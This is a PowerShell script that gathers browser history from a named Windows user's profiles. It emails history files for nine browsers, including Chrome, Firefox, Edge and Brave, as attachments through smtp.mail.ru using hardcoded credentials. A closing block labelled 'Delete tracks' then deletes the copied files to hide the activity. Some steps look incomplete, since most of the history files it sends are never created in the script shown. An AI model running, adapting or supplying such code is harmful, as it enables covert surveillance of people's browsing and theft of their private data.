#Set Email from
$EMAIL_FROM='test@test.com'
$EMAIL_FROM_PASS='test'
#Set Email to
$EMAIL_TO='test.test@test.com'
#Set user
$USER='user.user'
#Get Firefox history
$Firefox_History=Get-ChildItem -Path "C:\Users\$USER\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" | % { $_.FullName }
xcopy "$Firefox_History" "C:\" /Y
#Get Waterfox history
$Waterfox_History=Get-ChildItem -Path "C:\Users\$USER\AppData\Roaming\Waterfox\Profiles\*.default-release" | % { $_.FullName }
xcopy "$Waterfox_History" "C:\wplaces.sqlite" /Y
#Send Chrome browser history
Send-MailMessage -From "Browser history <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USER Chrome browser history" -Body "$USER Chrome browser history." -Attachment "C:\chrome_history" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
#Send Yandex browser history
Send-MailMessage -From "Browser history <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USER Yandex browser history" -Body "$USER Yandex browser history." -Attachment "C:\yandex_history" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
#Send Firefox browser history
Send-MailMessage -From "Browser history <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USER Firefox browser history" -Body "$USER Firefox browser history." -Attachment "C:\places.sqlite" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
#Send Waterfox browser history
Send-MailMessage -From "Browser history <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USER Waterfox browser history" -Body "$USER Waterfox browser history." -Attachment "C:\wplaces.sqlite" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
#Send Opera browser history
Send-MailMessage -From "Browser history <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USER Opera browser history" -Body "$USER Opera browser history." -Attachment "C:\opera_history" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
#Send OperaGX browser history
Send-MailMessage -From "Browser history <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USER OperaGX browser history" -Body "$USER OperaGX browser history." -Attachment "C:\operagx_history" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
#Send Brave browser history
Send-MailMessage -From "Browser history <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USER Brave browser history" -Body "$USER Brave browser history." -Attachment "C:\brave_history" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
#Send Vivaldi browser history
Send-MailMessage -From "Browser history <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USER Vivaldi browser history" -Body "$USER Vivaldi browser history." -Attachment "C:\vivaldi_history" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))
#Send Edge browser history
Send-MailMessage -From "Browser history <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USER Edge browser history" -Body "$USER Edge browser history." -Attachment "C:\edge_history" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))

#Delete tracks
del "C:\gbh*"
del "C:\*.sqlite"
del "C:\History"
del "C:\*_history"
del gbh.*
exit
